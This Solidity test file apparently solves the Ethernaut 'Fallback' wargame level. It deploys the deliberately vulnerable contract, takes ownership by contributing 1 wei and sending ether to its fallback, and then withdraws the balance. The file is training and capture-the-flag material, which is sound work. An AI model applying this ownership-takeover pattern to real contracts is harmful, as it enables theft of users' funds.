pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../../src/Fallback/FallbackFactory.sol";
import "../../src/Ethernaut.sol";
import "../utils/vm.sol";

contract FallbackTest is DSTest {
    Vm vm = Vm(HEVM_ADDRESS);
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testFallbackHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback ethernautFallback = Fallback(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        ethernautFallback.contribute{value: 1 wei}();
        address(ethernautFallback).call{value: 1 wei}("");
        ethernautFallback.withdraw();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
